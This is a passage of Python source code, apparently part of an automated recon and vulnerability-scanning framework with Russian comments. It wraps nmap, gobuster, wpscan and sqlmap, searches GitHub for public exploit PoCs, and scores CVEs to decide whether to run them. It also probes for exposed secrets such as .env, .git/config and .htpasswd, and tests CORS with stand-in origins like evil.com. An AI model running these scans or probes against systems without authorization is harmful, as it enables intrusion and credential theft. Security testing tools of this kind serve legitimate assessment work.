            self.session.headers["apiKey"] = api_key
        self.cache_dir = os.path.join(os.path.expanduser("~"), ".cache", "recon_framework")
        self.cache_file = os.path.join(self.cache_dir, "nvd_ranges.json")
        self._cache = None
        self._pending = {}  # cve -> [(min, min_incl, max, max_incl, product_hint), ...]
        self._fetched = set()
        self._warned = False

    def _load(self):
        if self._cache is not None:
            return
        self._cache = {}
        try:
            if os.path.exists(self.cache_file):
                with open(self.cache_file) as f:
                    raw = json.load(f)
                if time.time() - os.path.getmtime(self.cache_file) < 30 * 86400:
                    self._cache = {k.upper(): v for k, v in raw.items()}
                else:
                    os.remove(self.cache_file)
        except Exception:
            pass

    def _save(self):
        try:
            os.makedirs(self.cache_dir, exist_ok=True)
            with open(self.cache_file, "w") as f:
                json.dump(self._cache, f)
        except Exception:
            pass

    def prefetch(self, cves):
        """Загрузить диапазоны для списка CVE пачками по 10."""
        self._load()
        todo = [c.upper() for c in cves
                if re.match(r"^CVE-\d{4}-\d+$", str(c)) and c.upper() not in self._cache]
        todo = list(dict.fromkeys(todo))
        for i in range(0, len(todo), 10):
            chunk = todo[i:i + 10]
            try:
                r = self.session.get(
                    "https://services.nvd.nist.gov/rest/json/cves/2.0",
                    params={"cveId": chunk[0]}, timeout=30)
                # Bulk endpoint: по одному cveId за запрос; берём первый из чанка,
                # остальные дотянутся лениво в get_range()
                if r.status_code == 200:
                    self._ingest(r.json())
                elif r.status_code == 403 and not self._warned:
                    log_warning("[NVD] Rate limit (без ключа 5 запросов/30с); диапазоны из локального кэша")
                    self._warned = True
                    time.sleep(6)
            except Exception as e:
                if not self._warned:
                    log_warning(f"[NVD] Unavailable: {e}")
                    self._warned = True
                break
        self._save()

    def _ingest(self, data):
        for vuln in data.get("vulnerabilities", []):
            cve_obj = vuln.get("cve", {})
            cve_id = (cve_obj.get("id") or "").upper()
            if not cve_id:
                continue
            ranges = []
            for conf in cve_obj.get("configurations", []):
                for node in conf.get("nodes", []):
                    for cpe_match in node.get("cpeMatch", []):
                        crit = cpe_match.get("criteria", "")
                        m = re.search(r"cpe:2\.3:[^:]+:[^:]+:([^:]+):([^:]+)", crit)
                        if not m:
                            continue
                        prod_hint, ver = m.group(1).lower(), m.group(2)
                        if ver in ("*", "-"):
                            continue
                        ranges.append({
                            "product": prod_hint,
                            "min": cpe_match.get("versionStartIncluding"),
                            "max": cpe_match.get("versionEndIncluding"),
                        })
            if ranges:
                self._cache[cve_id] = ranges
            else:
                self._cache[cve_id] = []

    def get_ranges(self, cve):
        """Диапазоны CVE: сначала локальный статический словарь (точные
        min/max), потом NVD-кэш."""
        cu = str(cve).upper()
        self._load()
        if cu in self._cache:
            return self._cache[cu]
        try:
            r = self.session.get("https://services.nvd.nist.gov/rest/json/cves/2.0",
                                 params={"cveId": cu}, timeout=30)
            if r.status_code == 200:
                self._ingest(r.json())
                self._save()
        except Exception:
            pass
        return self._cache.get(cu)


# ═══════════════════════════════════════════════════════════════════════════════
# GITHUB PoC FINDER (НОВОЕ)
# ═══════════════════════════════════════════════════════════════════════════════
class GitHubPoCFinder:
    """Ищет публичные PoC на GitHub по CVE."""

    def __init__(self, token=None):
        self.token = token
        self.session = requests.Session()
        self.session.verify = False
        self.headers = {
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        }
        if token:
            self.headers["Authorization"] = f"token {token}"
        self._cache = {}
        # Circuit breaker: после первого 403/429 от API полностью отключаем
        # поиск, чтобы не спамить предупреждениями на каждый CVE.
        self._disabled = False

    def find_poc(self, cve):
        if self._disabled:
            return []
        cve_upper = cve.upper()
        if cve_upper in self._cache:
            return self._cache[cve_upper]

        results = []
        try:
            url = "https://api.github.com/search/repositories"
            queries = [
                f"{cve_upper} exploit",
                f"{cve_upper} poc",
                f"{cve_upper} vulnerability"
            ]
            for q in queries:
                params = {"q": q, "sort": "stars", "order": "desc", "per_page": 5}
                r = self.session.get(url, headers=self.headers, params=params, timeout=15)
                if r.status_code == 200:
                    data = r.json()
                    for item in data.get("items", []):
                        results.append({
                            "url": item.get("html_url", ""),
                            "name": item.get("full_name", ""),
                            "stars": item.get("stargazers_count", 0),
                            "description": item.get("description", "")[:100]
                        })
                    if len(results) >= 5:
                        break
                elif r.status_code in (403, 429):
                    remaining = r.headers.get("X-RateLimit-Remaining", "0")
                    if str(remaining) == "0" or r.status_code == 429:
                        self._disabled = True
                        retry_after = r.headers.get("Retry-After", "?")
                        log_warning(f"[GitHub] Rate limit exceeded (Retry-After: {retry_after}s), "
                                    "GitHub PoC search disabled for this run")
                        break
                    break
        except Exception as e:
            log_warning(f"[GitHub] Error searching PoC for {cve}: {e}")

        seen = set()
        unique = []
        for r in results:
            if r["url"] not in seen:
                seen.add(r["url"])
                unique.append(r)

        self._cache[cve_upper] = unique[:5]
        return unique[:5]


# ═══════════════════════════════════════════════════════════════════════════════
# VERSION CONFIDENCE ENGINE (НОВОЕ)
# ═══════════════════════════════════════════════════════════════════════════════
class ConfidenceEngine:
    """
    Присваивает score 0-100 каждой потенциальной уязвимости:
      90-100: Точная версия из CPE + CVE из vulners -> запускаем PoC
      70-89:  Точная версия из banner + CVE с версионным диапазоном -> запускаем check
      50-69:  Версия из banner + searchsploit match -> запускаем только check
      30-49:  Продукт совпадает, версия примерная -> информационный вывод
      0-29:   Только продукт без версии -> skip PoC, только информационный вывод
    """

    def __init__(self, vulners_engine, epss_kev_client):
        self.vulners = vulners_engine
        self.epss_kev = epss_kev_client
        self.nvd = NVDRangesClient()
        self._version_cache = {}

    def score(self, service_info, cve, exploit_source="generic"):
        product = (service_info.get("product") or "").lower()
        version = service_info.get("version", "")
        cpe = service_info.get("cpe", "")
        banner = service_info.get("banner", "")

        score = 0
        reasons = []

        # 1. CPE match (максимум 40 баллов)
        if cpe:
            v_vendor, v_prod, v_ver = self.vulners.normalize_cpe(cpe)
            if v_ver and version:
                if VersionParser.compare(version, v_ver) == 0:
                    score += 40
                    reasons.append("Exact CPE version match")
                else:
                    score += 20
                    reasons.append("CPE product match, version differs")
            else:
                score += 20
                reasons.append("CPE available")

        # 2. Banner version precision (максимум 30 баллов)
        if version:
            ver_parts = version.split()
            if len(ver_parts) >= 1 and re.match(r"^\d", ver_parts[0]):
                score += 30
                reasons.append("Exact version from banner")
            else:
                score += 15
                reasons.append("Partial version from banner")

        # 3. Source reliability (максимум 20 баллов)
        source_scores = {
            "vulners": 20,
            "nmap_vulners": 18,
            "metasploit": 15,
            "searchsploit": 10,
            "generic": 5
        }
        score += source_scores.get(exploit_source, 5)
        reasons.append(f"Source: {exploit_source}")

        # 4. EPSS/KEV boost (максимум 10 баллов)
        epss, is_kev, _ = self.epss_kev.get_priority_score(cve)
        if is_kev:
            score += 10
            reasons.append("CISA KEV confirmed")
        elif epss > 0.5:
            score += 7
            reasons.append(f"High EPSS: {epss:.2f}")
        elif epss > 0.1:
            score += 3
            reasons.append(f"Medium EPSS: {epss:.2f}")

        # 5. Version range check (penalty если версия точно НЕ в диапазоне)
        vuln_range = self._get_vulnerable_version_range(cve, product)
        if vuln_range and version:
            in_range = VersionParser.in_range(version, vuln_range.get("min"), vuln_range.get("max"))
            if in_range is False:
                score = min(score, 25)
                reasons.append("Version outside vulnerable range")
            elif in_range is True:
                score += 5
                reasons.append("Version inside vulnerable range")

        # 6. Эскалация: высокий EPSS/KEV при подтверждённом продукте —
        # не скипаем, а отдаём на безопасную проверку (msf check / nuclei),
        # даже если версия неизвестна (сервер её скрывает).
        product_matched_source = exploit_source in ("vulners", "nmap_vulners", "metasploit", "searchsploit")
        if (is_kev or epss >= 0.9) and product_matched_source and score < 55:
            score = 55
            reasons.append(f"Escalated to run_check: {'KEV' if is_kev else f'EPSS {epss:.2f}'} "
                           f"+ product confirmed, version unknown")

        score = min(100, max(0, score))

        if score >= 90:
            level = "CRITICAL"
            action = "run_poc"
        elif score >= 70:
            level = "HIGH"
            action = "run_check"
        elif score >= 50:
            level = "MEDIUM"
            action = "run_check"
        elif score >= 30:
            level = "LOW"
            action = "info_only"
        else:
            level = "INFO"
            action = "skip"

        return {
            "score": score,
            "level": level,
            "action": action,
            "reason": " | ".join(reasons),
            "epss": epss,
            "kev": is_kev
        }

    def _get_vulnerable_version_range(self, cve, product):
        """Локальный статический словарь (точные min/max) -> NVD API."""
        ranges = {
            "cve-2021-44228": {"product": ["log4j", "log4shell"], "min": None, "max": "2.14.1"},
            "cve-2021-41773": {"product": ["apache", "httpd"], "min": "2.4.49", "max": "2.4.49"},
            "cve-2021-42013": {"product": ["apache", "httpd"], "min": "2.4.49", "max": "2.4.50"},
            "cve-2022-22965": {"product": ["spring"], "min": None, "max": "5.3.17"},
            "cve-2017-5638": {"product": ["struts"], "min": None, "max": "2.3.32"},
            "cve-2018-11776": {"product": ["struts"], "min": None, "max": "2.3.34"},
            "cve-2020-5902": {"product": ["f5", "big-ip"], "min": None, "max": "15.1.0"},
            "cve-2019-19781": {"product": ["citrix", "netscaler"], "min": None, "max": "10.5"},
            "cve-2018-7600": {"product": ["drupal"], "min": None, "max": "7.58"},
            "cve-2021-26855": {"product": ["exchange", "microsoft"], "min": None, "max": "2019"},
            "cve-2020-1938": {"product": ["tomcat", "apache"], "min": None, "max": "9.0.30"},
            "cve-2021-26084": {"product": ["confluence"], "min": None, "max": "7.13.0"},
            "cve-2022-26134": {"product": ["confluence"], "min": None, "max": "7.18.0"},
            "cve-2014-6271": {"product": ["bash"], "min": None, "max": "4.3"},
            "cve-2014-0160": {"product": ["openssl"], "min": None, "max": "1.0.1f"},
            "cve-2021-43798": {"product": ["grafana"], "min": None, "max": "8.3.0"},
            "cve-2021-22205": {"product": ["gitlab"], "min": None, "max": "13.10.3"},
            "cve-2017-10271": {"product": ["weblogic"], "min": None, "max": "10.3.6"},
            "cve-2019-7238": {"product": ["nexus"], "min": None, "max": "3.14.0"},
            "cve-2022-0543": {"product": ["redis"], "min": None, "max": "6.2.6"},
            "cve-2014-3120": {"product": ["elasticsearch"], "min": None, "max": "1.1.1"},
            "cve-2015-1427": {"product": ["elasticsearch"], "min": None, "max": "1.4.3"},
            "cve-2022-33891": {"product": ["spark", "apache"], "min": None, "max": "3.2.1"},
            "cve-2023-46604": {"product": ["activemq"], "min": None, "max": "5.18.2"},
            "cve-2023-25194": {"product": ["druid", "apache"], "min": None, "max": "0.22.1"},
            "cve-2023-32315": {"product": ["openfire"], "min": None, "max": "4.7.4"},
            "cve-2023-20887": {"product": ["vmware", "aria"], "min": None, "max": "6.8.0"},
            "cve-2023-41892": {"product": ["craftcms"], "min": None, "max": "4.4.15"},
            "cve-2022-41622": {"product": ["f5", "big-ip"], "min": None, "max": "16.1.2"},
            "cve-2022-47966": {"product": ["manageengine"], "min": None, "max": "6.1"},
            "cve-2021-27850": {"product": ["apache", "tapestry"], "min": None, "max": "5.4.5"},
            "cve-2022-28810": {"product": ["manageengine"], "min": None, "max": "6.1"},
            "cve-2019-1458": {"product": ["windows"], "min": None, "max": "10"},
            "cve-2022-0995": {"product": ["linux"], "min": None, "max": "5.17"},
            "cve-2021-40449": {"product": ["windows"], "min": None, "max": "10"},
            "cve-2018-8453": {"product": ["windows"], "min": None, "max": "10"},
            "cve-2021-3490": {"product": ["linux"], "min": None, "max": "5.13"},
        }

        cve_lower = cve.lower()
        if cve_lower not in ranges:
            # Fallback: диапазоны из NVD (кэшируются на диск)
            product_lower = (product or "").lower()
            nvd_ranges = self.nvd.get_ranges(cve)
            if not nvd_ranges:
                return None
            # берём первый диапазон, где продукт совпадает или неизвестен
            for r in nvd_ranges:
                hint = (r.get("product") or "").lower()
                if not hint or not product_lower or hint in product_lower or product_lower in hint:
                    return {"min": r.get("min"), "max": r.get("max")}
            return None

        info = ranges[cve_lower]
        prod_match = any(p in product for p in info["product"]) if product else False
        if prod_match or not product:
            return {"min": info.get("min"), "max": info.get("max")}
        return None

# ═══════════════════════════════════════════════════════════════════════════════
# NMAP — с Vulners NSE script и CPE extraction
# ═══════════════════════════════════════════════════════════════════════════════
class NmapScanner:
    def __init__(self, timing="T4"):
        self.timing = timing
        self.is_root = check_root()
        if not self.is_root:
            log_warning("Без root: Nmap без -sS, -O, -f")
        self.vulners = VulnersEngine()

    def scan_ports(self, target, timeout=1800):
        log_info(f"[Nmap] Fast scan: {target}")
        cmd = ["nmap", "-p-", f"-{self.timing}", "--min-rate", "1000", "--max-retries", "2", "-Pn", "-oX", "-", target]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            if r.returncode != 0:
                log_error(f"Nmap err: {r.stderr[:200]}")
                return []
            root = ET.fromstring(r.stdout)
            ports = []
            for host in root.findall("host"):
                for ps in host.findall("ports"):
                    for port in ps.findall("port"):
                        st = port.find("state")
                        if st is not None and st.get("state") == "open":
                            ports.append(int(port.get("portid")))
            log_success(f"[Nmap] Open ports: {len(ports)}")
            return sorted(ports)
        except Exception as e:
            log_error(f"Nmap fast: {e}")
            return []

    def detailed_scan(self, target, ports, timeout=3600):
        if not ports:
            return {"ports": [], "os": None, "cpe_cves": []}
        log_info(f"[Nmap] Detailed: {len(ports)} ports on {target}")
        ps = ",".join(map(str, ports))
        cmd = [
            # --version-all даёт десятки проб на порт; intensity 5 = те же CPE в разы быстрее
            "nmap", "-sC", "-sV", "--version-intensity", "5", "-p", ps, "-A", "--reason",
            "--script", "vulners", f"-{self.timing}", "--max-retries", "2", "-oX", "-", target
        ]
        if self.is_root:
            cmd[1:1] = ["-O", "--osscan-guess", "-f"]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return self._parse_xml(r.stdout)
        except Exception as e:
            log_error(f"Nmap detailed: {e}")
            return {"ports": [], "os": None, "cpe_cves": []}

    def _parse_xml(self, xml_data):
        result = {"ports": [], "os": None, "cpe_cves": []}
        try:
            root = ET.fromstring(xml_data)
            for host in root.findall("host"):
                os_elem = host.find("os")
                if os_elem is not None:
                    osmatch = os_elem.find("osmatch")
                    if osmatch is not None:
                        result["os"] = {
                            "name": osmatch.get("name", ""),
                            "accuracy": osmatch.get("accuracy", ""),
                            "osclass": [],
                            "method": "nmap"
                        }
                        for oc in osmatch.findall("osclass"):
                            result["os"]["osclass"].append({
                                "type": oc.get("type", ""),
                                "vendor": oc.get("vendor", ""),
                                "osfamily": oc.get("osfamily", ""),
                                "osgen": oc.get("osgen", ""),
                                "accuracy": oc.get("accuracy", "")
                            })
                for ps in host.findall("ports"):
                    for port in ps.findall("port"):
                        svc_elem = port.find("service")
                        svc = {}
                        cpes = []
                        if svc_elem is not None:
                            svc = {k: svc_elem.get(k, "") for k in ["name", "product", "version", "extrainfo", "ostype"]}
                            cpes = self.vulners.extract_cpe_from_nmap_service(svc_elem)
                            if cpes:
                                svc["cpes"] = cpes
                                for cpe in cpes:
                                    cves = self.vulners.get_cves_by_cpe(cpe)
                                    if cves:
                                        for cve_info in cves:
                                            result["cpe_cves"].append({
                                                "port": port.get("portid"),
                                                "cpe": cpe,
                                                "cve": cve_info["cve"],
                                                "cvss": cve_info["cvss"],
                                                "source": "vulners_cpe"
                                            })
                        scripts = [{"id": s.get("id"), "output": s.get("output", "")} for s in port.findall("script")]
                        st = port.find("state")
                        result["ports"].append({
                            "port": port.get("portid"),
                            "protocol": port.get("protocol"),
                            "state": (st.get("state") if st is not None else "unknown"),
                            "service": svc,
                            "scripts": scripts
                        })
                vulners_cves = self.vulners.get_cves_from_nmap_vulners(xml_data)
                for vc in vulners_cves:
                    existing = [c["cve"] for c in result["cpe_cves"]]
                    if vc["cve"] not in existing:
                        result["cpe_cves"].append({
                            "port": vc.get("port"),
                            "cpe": "",
                            "cve": vc["cve"],
                            "cvss": 0,
                            "source": "nmap_vulners"
                        })
        except Exception as e:
            log_error(f"Parse XML: {e}")
        return result


class SubdomainScanner:
    def scan_stream(self, domain, callback):
        log_info(f"[Subfinder] Streaming: {domain}")
        cmd = ["subfinder", "-d", domain, "-all", "-silent"]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for line in proc.stdout:
                sub = line.strip()
                if sub:
                    callback(sub)
            proc.wait(timeout=600)
        except Exception as e:
            log_error(f"Subfinder stream: {e}")


class DirectoryScanner:
    INTERESTING = {200, 201, 204, 301, 302, 307, 308, 401, 403, 405, 407, 500, 502, 503}

    def __init__(self, wordlist, threads=50):
        self.wordlist = wordlist
        self.threads = threads
        if not os.path.exists(wordlist):
            log_error(f"Wordlist missing: {wordlist}")
            self.wordlist = None

    def scan(self, url, label="", timeout=1800):
        if not self.wordlist:
            return []
        log_info(f"[Gobuster] Dir: {url} [{label}]")
        out = f"/tmp/gob_dir_{hash(url)&0xFFFFFFFF}_{int(time.time())}.txt"
        cmd = [
            "gobuster", "dir", "-u", url, "-w", self.wordlist,
            "-t", str(self.threads), "-o", out, "-k", "--no-error", "-e"
        ]
        # адаптивная задержка: медленные цели не душатся 50 потоками
        cmd += ["-d", "0.1s", "--timeout", "15s"]
        results = []
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            if os.path.exists(out):
                with open(out) as f:
                    for line in f:
                        m = re.search(r"(https?://\S+)\s+\(Status:\s*(\d+)\)\s+\[Size:\s*(\d+)\]", line)
                        if m:
                            status = int(m.group(2))
                            if status in self.INTERESTING:
                                results.append({"url": m.group(1), "status": status, "size": int(m.group(3))})
                os.remove(out)
            log_success(f"[Gobuster] Found: {len(results)} [{label}]")
            return results
        except Exception as e:
            log_error(f"Gobuster dir: {e}")
            return []


class TechDetector:
    def detect(self, url, timeout=45):
        log_info(f"[WhatWeb] {url}")
        try:
            r = subprocess.run(["whatweb", "-a", "3", "--no-errors", url],
                               capture_output=True, text=True, timeout=timeout)
            out = r.stdout.strip()
            if out and out != url and "Error" not in out:
                log_success(f"[WhatWeb] {url}: {out[:120]}")
                return out
            return "Unknown"
        except Exception as e:
            log_error(f"[WhatWeb] err: {e}")
            return self._detect_by_headers(url)

    def _detect_by_headers(self, url):
        """Fallback, когда whatweb недоступен/таймаутит: снимок по заголовкам."""
        try:
            sess = requests.Session()
            sess.verify = False
            r = sess.get(url, timeout=10, allow_redirects=True,
                         headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"})
            hints = []
            for h in ["Server", "X-Powered-By", "X-Generator", "X-AspNet-Version"]:
                v = r.headers.get(h)
                if v:
                    hints.append(f"{h}: {v}")
            cookies = " ".join(r.headers.get("Set-Cookie", "").lower() for _ in [0])
            if "phpsessid" in cookies: hints.append("PHP (PHPSESSID)")
            if "jsessionid" in cookies: hints.append("Java (JSESSIONID)")
            if "asp.net" in cookies or "aspnetsession" in cookies: hints.append("ASP.NET")
            result = "; ".join(hints) if hints else "Unknown"
            log_info(f"[Tech] header fingerprint {url}: {result[:120]}")
            return result
        except Exception as e:
            return f"Error: {e}"
            return f"Error: {e}"


class LeakChecker:
    PATHS = [
        ".git/HEAD", ".git/config", ".env", ".env.local", "config.php", "config.json", "web.config",
        "backup.zip", "backup.sql", "dump.sql", "robots.txt", "sitemap.xml", ".htaccess", ".htpasswd",
        "phpinfo.php", "info.php", "api/", "api/v1/", "swagger.json", "swagger-ui.html", "openapi.json",
        "admin/", "login/", "wp-admin/", "wp-login.php", "docker-compose.yml", "Dockerfile",
        "test/", "dev/", "staging/", "old/", "backup/", "server-status", "trace.axd", "elmah.axd",
        "actuator/", "actuator/env", "graphql", "graphiql", "uploads/", "CHANGELOG.md", "README.md",
        "composer.json", "package.json", ".well-known/security.txt"
    ]

    def check(self, base_url):
        log_info(f"[LeakChecker] {base_url}")
        found = []
        sess = requests.Session()
        sess.verify = False
        sess.timeout = 8
        sess.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"})

        def check_one(path):
            try:
                u = urljoin(base_url + "/", path)
                resp = sess.get(u, allow_redirects=False, timeout=8)
                if resp.status_code in {200, 201, 204}:
                    if len(resp.content) < 10:
                        return None
                    c = resp.text[:500].lower()
                    if any(m in c for m in ["not found", "error 404", "no such file", "404 not found"]):
                        return None
                    return {"url": u, "status": resp.status_code, "size": len(resp.content), "path": path}
                elif resp.status_code == 403:
                    return {"url": u, "status": 403, "size": len(resp.content), "path": path, "note": "Exists but forbidden"}
            except:
                pass
            return None

        with ThreadPoolExecutor(max_workers=25) as ex:
            for fut in as_completed([ex.submit(check_one, p) for p in self.PATHS]):
                r = fut.result()
                if r:
                    found.append(r)
        log_success(f"[LeakChecker] Found: {len(found)}")
        return found


class DNSEnum:
    TYPES = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA", "PTR"]

    def enum(self, domain):
        log_info(f"[DNS] {domain}")
        results = {}
        for t in self.TYPES:
            try:
                r = subprocess.run(["dig", "+short", t, domain], capture_output=True, text=True, timeout=30)
                lines = [l.strip() for l in r.stdout.strip().split("\n") if l.strip()]
                if lines:
                    results[t] = lines
            except:
                pass
        if "TXT" in results:
            spf = [x for x in results["TXT"] if "v=spf1" in x.lower()]
            if spf:
                results["SPF"] = spf
        try:
            r = subprocess.run(["dig", "+short", "TXT", f"_dmarc.{domain}"], capture_output=True, text=True, timeout=30)
            dm = [l.strip() for l in r.stdout.strip().split("\n") if l.strip()]
            if dm:
                results["DMARC"] = dm
        except:
            pass
        log_success(f"[DNS] Records: {len(results)}")
        return results


class VHostScanner:
    def __init__(self, wordlist, threads=50):
        self.wordlist = wordlist
        self.threads = threads

    def scan(self, ip, domain, scheme="http", timeout=1800):
        if not is_ip(ip):
            log_warning(f"[VHost] Need IP, got {ip}")
            return []
        if not self.wordlist or not os.path.exists(self.wordlist):
            log_warning(f"[VHost] Wordlist not found ({self.wordlist}), skipping vhost scan")
            return []
        log_info(f"[VHost] {ip} (base: {domain})")
        out = f"/tmp/gob_vhost_{int(time.time())}.txt"
        temp = f"/tmp/vhost_wl_{int(time.time())}.txt"
        base = domain[4:] if domain.startswith("www.") else domain
        try:
            with open(self.wordlist) as f:
                words = [l.strip() for l in f if l.strip()]
            with open(temp, "w") as f:
                for w in words:
                    f.write(f"{w}.{base}\n{w}\n")
        except Exception as e:
            log_error(f"[VHost] wl prep: {e}")
            return []
        cmd = [
            "gobuster", "vhost", "-u", f"{scheme}://{ip}", "-w", temp,
            "-t", str(self.threads), "-o", out, "-k", "--no-error", "--append-domain"
        ]
        results = []
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            if os.path.exists(out):
                with open(out) as f:
                    for line in f:
                        m = re.search(r"Found:\s+(\S+)\s+\(Status:\s*(\d+)\)\s+\[Size:\s*(\d+)\]", line)
                        if m:
                            status = int(m.group(2))
                            if status in DirectoryScanner.INTERESTING:
                                results.append({"vhost": m.group(1), "status": status, "size": int(m.group(3))})
                os.remove(out)
            if os.path.exists(temp):
                os.remove(temp)
            log_success(f"[VHost] Found: {len(results)}")
            return results
        except Exception as e:
            log_error(f"[VHost] err: {e}")
            return []


class CORSCheker:
    ORIGINS = ["https://evil.com", "null", "https://attacker.com", "http://localhost", "https://localhost"]

    def check(self, url):
        log_info(f"[CORS] Checking: {url}")
        found = []
        sess = requests.Session()
        sess.verify = False
        sess.timeout = 10
        for origin in self.ORIGINS:
            try:
                r = sess.get(url, headers={"Origin": origin}, allow_redirects=False, timeout=10)
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                if acao:
                    if origin in acao or acao == "*":
                        risk = "HIGH" if ((acao == "*" and acac.lower() == "true") or (origin in acao and acac.lower() == "true")) else "MEDIUM"
                        found.append({"url": url, "origin": origin, "acao": acao, "acac": acac, "risk": risk})
            except:
                pass
        if found:
            log_warning(f"[CORS] {len(found)} misconfigs found!")
        return found


class SSLScanner:
    def scan(self, target, port=443):
        if not is_tool_installed("testssl.sh"):
            return None
        log_info(f"[SSL] testssl.sh: {target}:{port}")
        out = f"/tmp/testssl_{target}_{port}_{int(time.time())}.json"
        cmd = ["testssl.sh", "--fast", "--jsonfile", out, f"{target}:{port}"]
        try:
            subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            if os.path.exists(out):
                with open(out) as f:
                    data = json.load(f)
                os.remove(out)
                findings = [x for x in data if x.get("severity") in ["HIGH", "CRITICAL", "MEDIUM"]]
                log_success(f"[SSL] Findings: {len(findings)}")
                return findings
        except Exception as e:
            log_error(f"[SSL] err: {e}")
        return None


class FaviconExtractor:
    def extract(self, url):
        try:
            sess = requests.Session()
            sess.verify = False
            sess.timeout = 10
            r = sess.get(urljoin(url + "/", "favicon.ico"), allow_redirects=True, timeout=10)
            if r.status_code == 200 and len(r.content) > 0:
                h = hashlib.md5(r.content).hexdigest()
                return {"url": url, "md5": h, "size": len(r.content)}
        except:
            pass
        return None


class WordPressScanner:
    """WordPress fingerprinting: версия, тема, активные плагины.
    wpscan (если установлен) используется для полного перечисления."""

    COMMON_PLUGINS = [
        "contact-form-7", "elementor", "wpforms-lite", "woocommerce", "yoast",
        "akismet", "wordfence", "all-in-one-seo-pack", "jetpack", "wp-super-cache",
        "litespeed-cache", "really-simple-ssl", "duplicator", "file-manager",
        "responsive-lightbox", "loginizer", "google-site-kit", "redirection",
        "updraftplus", "wp-file-manager", "simple-file-list", "yellow-pencil-visual-theme-customizer",
    ]

    def detect(self, url, timeout=20):
        """Пассивный fingerprint: версия из feed/readme/meta, плагины по следам."""
        sess = requests.Session()
        sess.verify = False
        sess.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"})
        result = {"url": url, "version": None, "theme": None, "plugins": []}
        # 1. Версия из meta generator на главной
        try:
            r = sess.get(url, timeout=timeout)
            m = re.search(r'name="generator"\s+content="WordPress\s+([\d.]+)', r.text, re.I)
            if m:
                result["version"] = m.group(1)
            m = re.search(r'/wp-content/themes/([a-z0-9\-_]+)/', r.text, re.I)
            if m:
                result["theme"] = m.group(1)
            for p in re.findall(r'/wp-content/plugins/([a-z0-9\-_]+)/', r.text, re.I):
                if p not in result["plugins"]:
                    result["plugins"].append(p)
        except Exception:
            pass
        # 2. feed/readme
        if not result["version"]:
            for path, pat in [("/feed/", r"<generator>https://wordpress.org/\?v=([\d.]+)</generator>"),
                              ("/readme.html", r"Version\s+([\d.]+)")]:
                try:
                    r = sess.get(urljoin(url + "/", path.lstrip("/")), timeout=timeout)
                    m = re.search(pat, r.text)
                    if m:
                        result["version"] = m.group(1)
                        break
                except Exception:
                    continue
        # 3. Вероятные плагины по HTTP-следам (200 = есть)
        def probe(p):
            try:
                r = sess.get(urljoin(url + "/", f"wp-content/plugins/{p}/"), timeout=8, allow_redirects=False)
                return p if r.status_code in (200, 301, 403) else None
            except Exception:
                return None
        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=10) as ex:
            for fut in as_completed([ex.submit(probe, p) for p in self.COMMON_PLUGINS]):
                p = fut.result()
                if p and p not in result["plugins"]:
                    result["plugins"].append(p)
        return result

    def wpscan(self, url, timeout=900):
        """Полное перечисление через wpscan (Kali: apt install wpscan)."""
        if not is_tool_installed("wpscan"):
            log_warning("[WP] wpscan не установлен (apt install wpscan) — только пассивный fingerprint")
            return None
        out_file = f"/tmp/wpscan_{int(time.time())}.json"
        cmd = ["wpscan", "--url", url, "--no-banner", "--no-update",
               "--enumerate", "vp,vt,cb,dbe,u", "--format", "json", "-o", out_file]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                               env={**os.environ, "TERM": "dumb"})
            if os.path.exists(out_file):
                with open(out_file) as f:
                    data = json.load(f)
                os.remove(out_file)
                interesting = data.get("interesting_findings", [])
                ver = (data.get("version") or {}).get("number")
                if ver:
                    log_success(f"[WP] wpscan: WordPress {ver} ({len(interesting)} findings)")
                return data
            log_warning(f"[WP] wpscan без результата (code {r.returncode}); "
                        "без API-токена wpscan не показывает уязвимости плагинов — "
                        "--wp-token / WPSCAN_API_TOKEN")
            return None
        except Exception as e:
            log_warning(f"[WP] wpscan err: {e}")
            return None


def mysql_fingerprint(ip, port=3306, timeout=6):
    """Версия MySQL из handshake-пакета (сервер посылает её первым)."""
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        data = s.recv(128)
        s.close()
        # Протокол handshake MySQL/MariaDB = 9 или 10
        if len(data) > 5 and data[4] in (9, 10):
            end = data.find(b"\x00", 5)
            version = data[5:end].decode("utf-8", "ignore")
            if re.match(r"^\d+\.\d+\.\d+", version):
                return version
    except Exception:
        pass
    return None


class SQLMapScanner:
    """sqlmap для подтверждения SQLi. По умолчанию выключен: включается
    флагом --sqlmap. Консервативные настройки: --batch --level=1 --risk=1."""

    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.available = is_tool_installed("sqlmap")
        if not self.available:
            log_warning("[SQLMap] не установлен (apt install sqlmap) — "
                        "только встроенная дифференциальная проверка")

    def scan(self, url, timeout=300):
        if not self.available:
            return None
        try:
            cmd = ["sqlmap", "-u", url, "--batch", "--level=1", "--risk=1",
                   "--random-agent", "--threads=5", "--timeout=15", "--retries=2",
                   "--answers=" + quote("follow=N,redirect=N"),
                   "--output-dir", self.output_dir, "--disable-coloring"]
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                               env={**os.environ, "TERM": "dumb"})
            out = strip_ansi(r.stdout + "\n" + r.stderr)
            is_vuln = "is vulnerable" in out.lower()
            not_vuln = "does not seem to be" in out.lower() or "all tested parameters do not appear" in out.lower()
            dbms_m = re.search(r"back-end DBMS:\s*(.+)", out)
            if is_vuln:
                return {"target": url, "vulnerability": "SQL Injection", "type": "generic",
                        "status": "vulnerable",
                        "details": f"sqlmap confirmed ({dbms_m.group(1).strip() if dbms_m else 'dbms unknown'})",
